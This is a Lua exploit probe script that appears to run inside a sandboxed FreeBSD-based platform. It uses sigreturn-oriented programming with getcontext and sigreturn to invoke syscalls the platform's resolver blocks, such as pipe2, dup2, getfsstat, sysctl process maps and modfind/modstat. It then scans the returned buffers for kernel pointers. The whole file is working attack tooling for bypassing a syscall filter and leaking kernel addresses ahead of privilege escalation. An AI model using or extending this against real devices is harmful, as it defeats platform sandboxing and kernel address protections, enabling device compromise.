-- CRASH_CLASS: HIGH
-- PROBE 130b: SROP syscall triage — which info-leak syscalls survive?
--
-- kldstat(308) kills the process. We need to find syscalls that:
-- 1. Return useful kernel info (pointers, structures)
-- 2. Don't kill the process
-- 3. Were previously blocked by the Lua resolver but allowed by kernel
--
-- Strategy: try each in sequence with a canary print between.
-- If a syscall kills, everything after it is missing.
-- We sort by least-likely-to-kill first.

print("=== PROBE 130b: SROP SYSCALL TRIAGE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc20 = make_syscall(20)
local sc_getcontext = make_syscall(421)
local sc_sigreturn = make_syscall(417)
local pid = to_num(sc20())
print("[0] pid=" .. pid)

local MC = 0x40
local RAX = MC + 0x38
local RDI = MC + 0x08
local RSI = MC + 0x10
local RDX = MC + 0x18
local RCX = MC + 0x20
local R8  = MC + 0x28
local R9  = MC + 0x30
local R10 = MC + 0x50
local RIP = MC + 0xA0
local CTX_SIZE = 0x500

local function srop(num, a1, a2, a3, a4, a5, a6)
    local ctx = memory.alloc(CTX_SIZE)
    zero(ctx, CTX_SIZE)
    pcall(function() return sc_getcontext(uint64(ctx)) end)
    local rip_val = rq(ctx + RIP)
    local rh, rl = get_hi_lo(rip_val)
    wq(ctx + RIP, uint64(string.format("0x%X%08X", rh, rl - 2)))
    wq(ctx + RAX, uint64(num))
    if a1 then wq(ctx + RDI, a1) end
    if a2 then wq(ctx + RSI, a2) end
    if a3 then wq(ctx + RDX, a3) end
    if a4 then wq(ctx + RCX, a4) end  -- note: rcx is clobbered by syscall but R10 is arg4
    if a5 then wq(ctx + R8, a5) end
    if a6 then wq(ctx + R9, a6) end
    local ok, rv = pcall(function() return sc_sigreturn(uint64(ctx)) end)
    return rv, ok
end

local function srop4(num, a1, a2, a3, a4)
    local ctx = memory.alloc(CTX_SIZE)
    zero(ctx, CTX_SIZE)
    pcall(function() return sc_getcontext(uint64(ctx)) end)
    local rip_val = rq(ctx + RIP)
    local rh, rl = get_hi_lo(rip_val)
    wq(ctx + RIP, uint64(string.format("0x%X%08X", rh, rl - 2)))
    wq(ctx + RAX, uint64(num))
    if a1 then wq(ctx + RDI, a1) end
    if a2 then wq(ctx + RSI, a2) end
    if a3 then wq(ctx + RDX, a3) end
    if a4 then wq(ctx + R10, a4) end
    local ok, rv = pcall(function() return sc_sigreturn(uint64(ctx)) end)
    return rv, ok
end

local sc_mmap = make_syscall(477)
local ok_mm, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("[0] gpu=" .. hex(gpu))

--------------------------------------------------------------------
-- 1. pipe2(542) — create pipe fds (was blocked by resolver)
--------------------------------------------------------------------
print("")
print("[1] pipe2(542)...")
local pipe_buf = gpu
zero(pipe_buf, 16)
local rv = srop(542, pipe_buf, uint64(0))
print("  rv=" .. hex(rv) .. " fd0=" .. tostring(rd(pipe_buf)) .. " fd1=" .. tostring(rd(pipe_buf+4)))
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 2. dup(41) — duplicate fd
--------------------------------------------------------------------
print("")
print("[2] dup(41) fd=4...")
rv = srop(41, uint64(4))
print("  rv=" .. hex(rv))
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 3. dup2(90) — dup to specific fd
--------------------------------------------------------------------
print("")
print("[3] dup2(90) 4->100...")
rv = srop(90, uint64(4), uint64(100))
print("  rv=" .. hex(rv))
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 4. getfsstat(395) — mounted filesystem info
--------------------------------------------------------------------
print("")
print("[4] getfsstat(395)...")
local fs_buf = gpu + 0x1000
zero(fs_buf, 0x2000)
rv = srop(395, fs_buf, uint64(0x2000), uint64(2))
print("  rv=" .. hex(rv))
local rh4, rl4 = get_hi_lo(rv)
if rl4 > 0 and rl4 < 100 then
    print("  " .. rl4 .. " filesystems!")
    for i = 0, math.min(rl4 - 1, 3) do
        local base = fs_buf + i * 0x240  -- sizeof(struct statfs) ~ 0x240
        print("  fs[" .. i .. "]:")
        for off = 0, 0x40, 8 do
            local v = rq(base + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh ~= 0 or vl ~= 0 then
                    print(string.format("    +0x%03X: %s", off, hex(v)))
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        print("    *** KERNEL POINTER! ***")
                    end
                end
            end
        end
    end
end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 5. __getcwd(326) — current working directory
--------------------------------------------------------------------
print("")
print("[5] __getcwd(326)...")
local cwd_buf = gpu + 0x4000
zero(cwd_buf, 0x400)
rv = srop(326, cwd_buf, uint64(0x400))
print("  rv=" .. hex(rv))
local cwd = ""
for i = 0, 0xFF do
    local b = rd(cwd_buf + i)
    if b == nil or b == 0 then break end
    if b >= 32 and b < 127 then cwd = cwd .. string.char(b) end
end
if #cwd > 0 then print("  cwd=" .. cwd) end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 6. sysctl kern.proc.vmmap via SROP (previously returned -1)
--------------------------------------------------------------------
print("")
print("[6] sysctl kern.proc.vmmap...")
local mib6 = gpu + 0x4800
zero(mib6, 32)
wd(mib6, 1)       -- CTL_KERN
wd(mib6+4, 14)    -- KERN_PROC
wd(mib6+8, 35)    -- KERN_PROC_VMMAP
wd(mib6+12, pid)
local out6 = gpu + 0x5000
zero(out6, 0x4000)
local len6 = gpu + 0x4810
wq(len6, uint64(0x4000))
rv = srop4(202, uint64(mib6), uint64(4), out6, uint64(len6))
print("  rv=" .. hex(rv))
local retlen = rq(len6)
print("  retlen=" .. hex(retlen))
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 7. sysctl kern.proc.filedesc via SROP
--------------------------------------------------------------------
print("")
print("[7] sysctl kern.proc.filedesc...")
local mib7 = gpu + 0x9800
zero(mib7, 32)
wd(mib7, 1)       -- CTL_KERN
wd(mib7+4, 14)    -- KERN_PROC
wd(mib7+8, 33)    -- KERN_PROC_FILEDESC
wd(mib7+12, pid)
local out7 = gpu + 0xA000
zero(out7, 0x4000)
local len7 = gpu + 0x9810
wq(len7, uint64(0x4000))
rv = srop4(202, uint64(mib7), uint64(4), out7, uint64(len7))
print("  rv=" .. hex(rv))
retlen = rq(len7)
print("  retlen=" .. hex(retlen))
if to_num(rv) == 0 then
    local rl7 = to_num(retlen)
    if rl7 > 0 then
        print("  filedesc dump (first 0x80 bytes):")
        for off = 0, math.min(rl7, 0x80) - 4, 8 do
            local v = rq(out7 + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh ~= 0 or vl ~= 0 then
                    print(string.format("    +0x%03X: %s", off, hex(v)))
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        print("    *** KERNEL POINTER! ***")
                    end
                end
            end
        end
    end
end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 8. modfind(300) + modstat(301)
--------------------------------------------------------------------
print("")
print("[8] modfind(300) 'kernel'...")
local name8 = gpu + 0xE000
zero(name8, 0x40)
local kn = "kernel"
for i = 1, #kn do pcall(function() memory.write_byte(name8+i-1, string.byte(kn,i)) end) end
pcall(function() memory.write_byte(name8+#kn, 0) end)
rv = srop(300, name8)
print("  modfind rv=" .. hex(rv))
local rh8, rl8 = get_hi_lo(rv)
print("[alive] pid=" .. to_num(sc20()))

if rl8 > 0 and rl8 < 0x10000 then
    print("[8b] modstat(301) id=" .. rl8 .. "...")
    local ms_buf = gpu + 0xE100
    zero(ms_buf, 0x100)
    wd(ms_buf, 0x60)  -- version
    rv = srop(301, uint64(rl8), ms_buf)
    print("  modstat rv=" .. hex(rv))
    for off = 0, 0x60, 8 do
        local v = rq(ms_buf + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh ~= 0 or vl ~= 0 then
                print(string.format("    +0x%03X: %s", off, hex(v)))
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    print("    *** KERNEL POINTER! ***")
                end
            end
        end
    end
end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 9. thr_self(432) — get thread ID
--------------------------------------------------------------------
print("")
print("[9] thr_self(432)...")
local tid_buf = gpu + 0xE200
zero(tid_buf, 8)
rv = srop(432, tid_buf)
print("  rv=" .. hex(rv) .. " tid=" .. tostring(rd(tid_buf)))
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 10. clock_gettime(232) — sanity
--------------------------------------------------------------------
print("")
print("[10] clock_gettime(232)...")
local ts = gpu + 0xE300
zero(ts, 16)
rv = srop(232, uint64(0), ts)
print("  rv=" .. hex(rv) .. " sec=" .. tostring(rd(ts)) .. " nsec=" .. tostring(rd(ts+8)))
print("[alive] pid=" .. to_num(sc20()))

print("")
print("[FINAL] pid=" .. to_num(sc20()))
print("=== PROBE 130b COMPLETE ===")
